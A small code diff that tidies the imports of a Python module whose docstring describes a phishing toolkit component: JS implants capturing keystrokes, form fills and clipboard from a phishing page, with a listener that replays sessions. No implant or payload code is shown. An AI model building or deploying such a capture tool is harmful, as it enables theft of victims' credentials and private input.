@@ -5,15 +5,12 @@ Generates minimal JS implants that capture keystrokes, form fills,
 clipboard, and DOM mutations from a phishing page — like Clarity but offensive.
 Includes a Python listener server that receives and replays sessions.
 """
-import os
 import json
-import time
-import base64
 import threading
-from http.server import HTTPServer, BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import Callable, Optional
-from shadowcypher.core.logger import logger
 
+from shadowcypher.core.logger import logger
 
 # ── JS Implant Template ───────────────────────────────────────────────────────
 
